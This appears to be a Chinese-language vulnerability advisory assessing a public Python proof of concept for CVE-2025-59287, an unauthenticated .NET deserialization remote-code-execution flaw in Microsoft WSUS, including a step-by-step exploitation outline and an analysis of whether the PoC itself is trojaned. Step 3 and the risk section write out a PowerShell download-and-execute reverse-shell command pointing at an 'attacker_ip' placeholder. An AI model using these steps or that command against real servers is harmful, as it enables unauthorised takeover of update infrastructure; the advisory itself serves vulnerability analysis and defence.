## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2025, Windows Server 2022, Windows Server 2019, Windows Server 2012, Windows Server 2016

**利用条件:** 未经身份验证的远程攻击者，无需认证即可利用，通过网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析：
提供的Python PoC脚本 (PoC.py) 是一个强大且看似功能齐全的漏洞利用工具，专门针对CVE-2025-59287，这是一个存在于Microsoft Windows Server Update Services (WSUS) 中的高危远程代码执行（RCE）漏洞。该漏洞的根本原因是不安全的`.NET`反序列化缺陷，具体表现在WSUS服务处理`AuthorizationCookie`以及其他事件数据时，通过SOAP请求进行。该脚本结构良好，利用了标准的Python库，如`requests`用于HTTP通信，`xml.etree`用于XML解析和操作，以及`uuid`用于生成客户端标识符。

PoC的设计清晰地反映了对WSUS漏洞利用链的深刻理解。它精确地实现了漏洞利用过程中两个关键的、顺序的步骤。首先，它使用`get_auth_cookie`函数与`/SimpleAuthWebService/SimpleAuth.asmx`端点进行交互，专门调用`GetAuthorizationCookie` SOAP操作。这一初始步骤至关重要，因为它可以在不需要任何事先认证的情况下，从目标WSUS服务器获取一个有效的`AuthorizationCookie`。这种对Cookie生成机制的未经身份验证的访问是后续RCE成功的关键。

其次，`send_rce_payload`函数负责实际的远程代码执行。此函数旨在向WSUS服务器的`/EventWebService/Event.asmx`端点发送一个特制的SOAP请求。漏洞利用的核心在于`_build_event_data`函数，它负责嵌入一个恶意的`.NET`反序列化Payload。这个Payload通常由`ysoserial.net`等外部工具生成，被注入到SOAP主体内的`SerializedEvent`字段中。当WSUS服务器在处理`SubmitEvent`或`SubmitScanEvent`请求时尝试反序列化这些恶意数据时，Payload中嵌入的攻击者任意命令将在WSUS服务的上下文中执行，从而导致服务器的完全控制。

脚本的命令行接口由`argparse`提供支持，允许灵活配置目标URL、端口、要执行的特定命令以及代理设置。它还包含调试功能，有助于理解漏洞利用流程和故障排除。对HTTPS的明确处理以及禁用SSL证书验证（`verify=False`）的能力进一步增强了其在各种网络环境中的实际适用性。PoC直接引用了多个受信任的安全研究资源（Hawktrace、tecxx和pwntester/ysoserial.net的GitHub存储库、Code-White博客），这极大地增强了其技术方法和有效性的可信度。这表明该脚本是建立在利用此类漏洞的既定研究和方法论之上的。鉴于这些特性，如果目标WSUS服务器存在漏洞，该PoC被认为是高效且能够实现远程代码执行。

利用步骤：
1.  **环境准备**: 确保已安装Python 3环境，并安装必要的库：`pip install requests`。攻击者需要能够访问目标WSUS服务器的网络。准备一个`.NET`反序列化Payload生成工具，例如`ysoserial.net`。此工具用于生成将在WSUS服务器上执行的恶意命令序列化数据。例如，可以生成一个执行特定命令（如启动反向shell）的`TypeConfuseDelegate`或`ObjectDataProvider`链。
2.  **获取授权Cookie**: PoC脚本会自动处理此步骤。它首先向目标WSUS服务器的`/SimpleAuthWebService/SimpleAuth.asmx`路径发送一个SOAP请求，调用`GetAuthorizationCookie`方法。此请求无需任何认证，WSUS服务器会返回一个包含`CookieData`的响应。脚本会从响应中提取出这个`CookieData`，作为后续请求的认证凭证。
3.  **生成恶意Payload**: 使用`ysoserial.net`等工具生成包含恶意命令的Base64编码的`.NET`反序列化Payload。例如，生成一个执行`cmd.exe /c "powershell.exe -NoP -NonI -Exec Bypass -C IEX (New-Object System.Net.WebClient).DownloadString('http://attacker_ip:port/shell.ps1')"`的反向shell命令。
4.  **注入Payload并触发RCE**: 运行PoC脚本，并提供目标WSUS服务器的URL、端口和生成的恶意Payload。PoC脚本将把这个Base64编码的恶意Payload嵌入到SOAP请求的`SerializedEvent`字段中，并将其作为`SubmitEvent`或`SubmitScanEvent`请求的一部分，发送到WSUS服务器的`/EventWebService/Event.asmx`路径。WSUS服务器在处理此请求时，会尝试反序列化`SerializedEvent`中的数据。由于其中包含恶意构造的Payload，反序列化过程将导致服务器执行预设的命令。
5.  **确认RCE**: 如果Payload是一个反向shell，攻击者应在监听端口上接收到来自WSUS服务器的连接。如果Payload是其他命令（如创建文件、执行`ping`），攻击者可以通过其他方式验证命令是否成功执行。

投毒风险分析：
对提供的`PoC.py`代码进行投毒风险分析，结果显示其投毒风险评估为低，具体为10%。分析基于以下几个方面：

代码透明度与可读性: 该PoC脚本使用Python编写，代码结构清晰，易于阅读和理解。关键功能模块（如`get_auth_cookie`, `send_rce_payload`, `_build_event_data`）被明确定义，变量命名规范，且包含适当的注释。代码中没有发现任何试图进行混淆、加密或隐藏其真实意图的迹象。
依赖项检查: 脚本主要依赖于Python的标准库（如`os`, `sys`, `uuid`, `datetime`, `xml.etree`）和广泛使用的第三方库`requests`。`requests`是一个成熟且受信的HTTP客户端库，其本身不包含恶意功能。没有引入其他非标准或可疑的外部依赖。
行为分析: PoC的核心逻辑是构造特定的SOAP请求，以利用WSUS服务中的不安全反序列化漏洞。它旨在证明漏洞的存在和可利用性，而非对运行PoC的系统造成损害。脚本不包含以下任何恶意行为：未经用户授权下载或执行外部可执行文件或脚本（除了作为攻击目标 的WSUS服务器在被利用后可能下载的Payload）。篡改用户本地文件系统或修改系统配置。尝试植入后门、密钥记录器或进行未经授权的网络扫描。通过`eval()`、动态加载代码或类似机制执行来自不可信来源的代码（除了作为Payload注入到目标服务器的代码）。
外部引用: 脚本中引用的外部资源（如`hawktrace.com`, `github.com/tecxx`, `code-white.com`）均为公开的安全研究和PoC项目，这些都是用于理解和利用漏洞的合法研究材料。
混淆与恶意Payload区分: 需要明确区分PoC代码本身的行为与PoC利用成功后受害服务器可能执行的恶意Payload。搜索结果中提及的`powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString(...`是一个典型的后渗透阶段命令，它会由被攻击的WSUS服务器执行，而非PoC脚本自身在攻击者机器上执行。PoC仅仅是负责将此Payload传递给目标。

综上所述，该PoC脚本是一段专注于漏洞利用的合法安全研究工具，其设计和实现均未包含对使用者自身造成危害的恶意功能。因此，其投毒风险极低。用户在使用时仍建议进行代码审查以确保安全。

**项目地址:** https://github.com/tecxx/CVE-2025-59287-WSUS

**漏洞详情:** https://www.freebuf.com/articles/466034.html
